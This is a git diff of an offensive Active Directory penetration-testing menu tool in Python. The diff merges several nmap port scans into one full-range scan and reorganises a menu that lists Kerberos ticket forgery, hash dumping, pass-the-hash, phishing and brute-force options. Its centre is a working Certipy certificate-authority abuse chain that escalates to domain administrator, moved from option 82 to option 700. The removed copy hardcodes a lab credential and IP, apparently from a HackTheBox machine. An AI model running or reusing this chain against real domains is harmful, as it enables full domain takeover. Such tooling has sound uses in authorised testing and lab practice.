@@ -310,21 +310,11 @@ def getTCPorts():
    if checkParam == 1:
       return "EMPTY"
    else:
-      print(colored("[*] Attempting to enumerate live tcp ports, please wait...", colour3))
-      nmap = nmap3.NmapScanTechniques()      
-      print("[+] Attempting to enumerate well known ports 0-1023...")
-      results = nmap.nmap_tcp_scan(TIP.rstrip(" "),args="-p 0-1023") # Dict
-      with open("tcp1.json", "w") as outfile:
-         json.dump(results, outfile, indent=4)         
-      print("[+] Attempting to enumerate registered ports 1024-49151...")
-      results = nmap.nmap_tcp_scan(TIP.rstrip(" "),args="-p 1024-49151") # Dict
-      with open("tcp2.json", "w") as outfile:
+      print(colored("[*] Attempting to enumerate all live tcp ports, please wait...", colour3))
+      nmap = nmap3.NmapScanTechniques()
+      results = nmap.nmap_tcp_scan(TIP.rstrip(" "),args="-p 0-65535") # Dict
+      with open("tcp.json", "w") as outfile:
          json.dump(results, outfile, indent=4)
-      print("[+] Attempting to enumerate dynamic ports 49152-65535...")
-      results = nmap.nmap_tcp_scan(TIP.rstrip(" "),args="-p 49152-65535") # Dict
-      with open("tcp3.json", "w") as outfile:
-         json.dump(results, outfile, indent=4)         
-      localCOM("cat tcp1.json > tcp.json; cat tcp2.json >> tcp.json; cat tcp3.json >> tcp.json")
       localCOM("cat tcp.json | grep 'portid' | cut -d ':' -f 2 | tr '\n' ' ' | tr -d '[:space:]' | sed 's/,$//' > ports1.tmp")
       localCOM("cat tcp.json | grep 'name' | cut -d ':' -f 2 | tr '\n' ' ' | tr -d '[:space:]' | sed 's/,$//' > service1.tmp")
       this_Ports = linecache.getline("ports1.tmp", 1).rstrip("\n") 
@@ -397,8 +387,6 @@ def getUDPorts():
             servsUDP[loop2] = spacePadding(y2, COL4)
             loop2 = loop2 + 1 
          break  
-#      this_Ports2 = this_Ports2.replace(",",",U:")
-#      this_Ports2 = "U:" + this_Ports2
    return this_Ports2
    
 def squidCheck():
@@ -789,20 +777,20 @@ def dispMenu():
    return
    
 def options():
-   print('\u2551' + "(01) Re/Set O/S FORMAT  (11) Re/Set DOMAINSID (31) Get Arch (41) WinLDAP Search (51) Kerberos Info (61) Gold Ticket (71) ServScanner (81) gRPClient   (91 ) FTP      (231) Scan Live PORTS (341) Edit   Usernames (441) Whois DNS    (500) Nuclei Scanner (600) LFI OS Checker (700)           (   )                     " + '\u2551')   
-   print('\u2551' + "(02) Re/Set DNS ADDRESS (12) Re/Set SUBDOMAIN (32) Net View (42) Look up SecIDs (52) Kerberos Auth (62) Gold DC PAC (72) VulnScanner (82) GenFakecert (92 ) SSH      (232) TCP PORTS  Scan (342) Edit   Passwords (442) Dig DNS      (501) Nuclei WP Scan (601) LFI   Wordlist (   )           (   )                     " + '\u2551')      
-   print('\u2551' + "(03) Re/Set IP  ADDRESS (13) Re/Set FILE NAME (33) Services (43) Sam Dump Users (53) KerberosBrute (63) Domain Dump (73) ExplScanner (83) GenSSHKeyID (93 ) SSHKeyID (233) UDP PORTS  Scan (343) Edit NTLM Hashes (443) Enum DOMAIN  (502) Wordpress Scan (602) Nuclei LFI     (   )           (   )                     " + '\u2551')   
-   print('\u2551' + "(04) Re/Set LIVE  PORTS (14) Re/Set SHARENAME (34) AT  Exec (44) REGistry Hives (54) KerbeRoasting (64) Blood Hound (74) Expl Finder (84) GenListUser (94 ) Telnet   (234) Basic Serv Scan (344) Edit   Host.conf (444) Recon DOMAIN (503) WP Plugin Scan (603)                (   )           (   )                     " + '\u2551')
-   print('\u2551' + "(05) Re/Set WEBSITE URL (15) Re/Set SERVERS   (35) DComExec (45) Enum EndPoints (55) ASREPRoasting (65) LAPS Dumper (75) ExplCreator (85) GenListPass (95 ) Netcat   (235) Light Serv Scan (345) Edit Resolv.conf (445) Enum Sub-DOM (504)                (604)                (   )           (   )                     " + '\u2551')
-   print('\u2551' + "(06) Re/Set USER   NAME (16) Re/Set REV SHELL (36) PS  Exec (46) Rpc ClientServ (56) PASSWORD2HASH (66) SecretsDump (76) Dir Listing (86) NTDSDECRYPT (96 ) MSSQL    (236) Heavy Serv Scan (346) Edit ProxyChains (446) EnumVirtHOST (505)                (605)                (   )           (   )                     " + '\u2551')
-   print('\u2551' + "(07) Re/Set PASS   WORD (27)                  (37) SMB Exec (47) Smb ClientServ (57) Pass the HASH (67) CrackMapExe (77) SNMP Walker (87) Hail! HYDRA (97 ) MySQL    (237)                 (347) Edit  Kerb5.conf (447) FUZZ Sub-DOM (506)                (606)                (   )           (   )                     " + '\u2551')
-   print('\u2551' + "(08) Re/Set NTLM   HASH (28) Re/Set Community (38) WMO Exec (48) Smb Map SHARES (58) OverPass HASH (68) PSExec HASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238)                 (348)                  (448) HTTP GitDump (507)                (607) Neo4j Console  (   )           (   )                     " + '\u2551')
-   print('\u2551' + "(09) Re/Set TICKET NAME (29) Re/Set FUZZRIDER (39) NFS List (49) Smb Dump Files (59) Kerbe5 Ticket (69) SmbExecHASH (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239)                 (349)                  (449)              (508)                (608) Neo4j Database (   )           (998) SSH Port Forward    " + '\u2551')
-   print('\u2551' + "(10) Re/Set DOMAIN NAME (30) Re/Set WORD LIST (40) NFSMount (50) Smb MountSHARE (60) Silver Ticket (70) WmiExecHASH (80) MSF Console (90) Rsync Dumps (100) RDPBrute (240)                 (350)                  (450)              (509)                (609) BloodHound GUI (   )           (999)", end= ' ')
+   print('\u2551' + "(01) Re/Set O/S FORMAT  (11) Re/Set DOMAINSID (31) Get Arch (41) WinLDAP Search (51) Kerberos Info (61) Gold Ticket (71) ServScanner (81) gRPClient   (91 ) FTP      (231) Scan Live PORTS (341) Edit   Usernames (441) Whois DNS    (500) Nuclei Scanner (600) LFI OS Checker (700) FakeCerts template                  " + '\u2551')   
+   print('\u2551' + "(02) Re/Set DNS ADDRESS (12) Re/Set SUBDOMAIN (32) Net View (42) Look up SecIDs (52) Kerberos Auth (62) Gold DC PAC (72) VulnScanner (82)             (92 ) SSH      (232) TCP PORTS  Scan (342) Edit   Passwords (442) Dig DNS      (501) Nuclei WP Scan (601) LFI   Wordlist (   )                                     " + '\u2551')      
+   print('\u2551' + "(03) Re/Set IP  ADDRESS (13) Re/Set FILE NAME (33) Services (43) Sam Dump Users (53) KerberosBrute (63) Domain Dump (73) ExplScanner (83) GenSSHKeyID (93 ) SSHKeyID (233) UDP PORTS  Scan (343) Edit NTLM Hashes (443) Enum DOMAIN  (502) Wordpress Scan (602) Nuclei LFI     (   )                                     " + '\u2551')   
+   print('\u2551' + "(04) Re/Set LIVE  PORTS (14) Re/Set SHARENAME (34) AT  Exec (44) REGistry Hives (54) KerbeRoasting (64) Blood Hound (74) Expl Finder (84) GenListUser (94 ) Telnet   (234) Basic Serv Scan (344) Edit   Host.conf (444) Recon DOMAIN (503) WP Plugin Scan (603)                (   )                                     " + '\u2551')
+   print('\u2551' + "(05) Re/Set WEBSITE URL (15) Re/Set SERVERS   (35) DComExec (45) Enum EndPoints (55) ASREPRoasting (65) LAPS Dumper (75) ExplCreator (85) GenListPass (95 ) Netcat   (235) Light Serv Scan (345) Edit Resolv.conf (445) Enum Sub-DOM (504)                (604)                (   )                                     " + '\u2551')
+   print('\u2551' + "(06) Re/Set USER   NAME (16) Re/Set REV SHELL (36) PS  Exec (46) Rpc ClientServ (56) PASSWORD2HASH (66) SecretsDump (76) Dir Listing (86) NTDSDECRYPT (96 ) MSSQL    (236) Heavy Serv Scan (346) Edit ProxyChains (446) EnumVirtHOST (505)                (605)                (   )                                     " + '\u2551')
+   print('\u2551' + "(07) Re/Set PASS   WORD (27)                  (37) SMB Exec (47) Smb ClientServ (57) Pass the HASH (67) CrackMapExe (77) SNMP Walker (87) Hail! HYDRA (97 ) MySQL    (237)                 (347) Edit  Kerb5.conf (447) FUZZ Sub-DOM (506)                (606)                (   )                                     " + '\u2551')
+   print('\u2551' + "(08) Re/Set NTLM   HASH (28) Re/Set Community (38) WMO Exec (48) Smb Map SHARES (58) OverPass HASH (68) PSExec HASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238)                 (348)                  (448) HTTP GitDump (507)                (607) Neo4j Console  (   )                                     " + '\u2551')
+   print('\u2551' + "(09) Re/Set TICKET NAME (29) Re/Set FUZZRIDER (39) NFS List (49) Smb Dump Files (59) Kerbe5 Ticket (69) SmbExecHASH (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239)                 (349)                  (449)              (508)                (608) Neo4j Database (998) SSH Port Forward                    " + '\u2551')
+   print('\u2551' + "(10) Re/Set DOMAIN NAME (30) Re/Set WORD LIST (40) NFSMount (50) Smb MountSHARE (60) Silver Ticket (70) WmiExecHASH (80) MSF Console (90) Rsync Dumps (100) RDPBrute (240)                 (350)                  (450)              (509)                (609) BloodHound GUI (999)", end= ' ')
    if proxyChains == 1:
-      print(colored(menuName,colour0, attrs=['blink']), end= ' ' + '\u2551')
+      print(colored(menuName,colour0, attrs=['blink']), end= ' ' + "                " + '\u2551')
    else:
-      print(menuName, end= ' ' + '\u2551')
+      print(menuName, end= ' ' + "                " + '\u2551')
    print("")
    print('\u255A' + '\u2550'*313 + '\u255D')
    return
@@ -962,9 +950,7 @@ SHAR = [" "*COL2]*maxUser			# SHARE NAMES
 USER = [" "*COL3]*maxUser			# USER NAMES
 HASH = [" "*COL4]*maxUser			# NTLM HASH
 VALD = ["0"*COL5]*maxUser			# USER TOKENS
-
-tcpPorts = ""					# ALL TCP PORTS
-udpPorts = ""					# ALL UDP PORTS
+					# ALL UDP PORTS
 portsTCP = ["EMPTY"]*screenLength		# TCP PORTS [x]
 portsUDP = ["EMPTY"]*screenLength		# UDP PORTS [x] 
 servsTCP = [" "*COL4]*screenLength      	# TCP SERVICE BANNER
@@ -3337,30 +3323,6 @@ while True:
 
    if selection =='81':
       prompt() 
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - Certipy parsFile
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='82':
-      remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x 'whoami /all' > priv.tmp")
-      catsFile("priv.tmp")
-      with open("priv.tmp") as file:
-         contents = file.read()
-         if "SeMachineAccountPrivilege" in contents:      
-            localCOM("certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -add-officer raven -ca 'manager-DC01-CA'")
-            localCOM("certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -enable-template 'SubCA'")
-            localCOM("certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -template SubCA -upn administrator@manager.htb -target manager.htb")
-            localCOM("certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -issue-request 45")
-            localCOM("certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -retrieve 45")
-            localCOM("certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236 -domain manager.htb -username administrator")
-         else:
-            pass
-      prompt() 
  
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -4375,6 +4337,33 @@ while True:
       localCOM("xdotool type 'bloodhound'; xdotool key Return")
       localCOM("xdotool key Ctrl+Tab") 
       prompt()      
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Certipy parsFile
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='700':
+      remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x 'whoami /all' > priv.tmp")
+      catsFile("priv.tmp")
+      with open("priv.tmp") as file:
+         contents = file.read()
+         if "SeMachineAccountPrivilege" in contents:   
+            localCOM("certipy find -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -dc-ip " + TIP.rstrip(" ") + " -dc-only -stdout") # This gives manager-DC01-CA 
+            # INPUT FIELD HERE
+            localCOM("certipy ca -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -add-officer " + USR.rstrip(" ") + " -ca 'manager-DC01-CA'") # manager-DC01-CA replace
+            localCOM("certipy ca -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -ca 'manager-DC01-CA' -enable-template 'SubCA'")  # manager-DC01-CA and SubCA replace
+            localCOM("certipy req -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -ca 'manager-DC01-CA' -template SubCA -upn administrator@" + DOM.rstrip(" ") + " -target " + DOM.rstrip(" ")) # This gives 45
+            # INPUT FIELD HERE            
+            localCOM("certipy ca -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -ca 'manager-DC01-CA' -issue-request 14") #45 replace
+            localCOM("certipy req -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -ca 'manager-DC01-CA' -target " + DOM.rstrip(" ") + " -retrieve 14") #45 replace
+            localCOM("certipy auth -pfx administrator.pfx -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -username administrator")
+         else:
+            pass
+      prompt() 
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
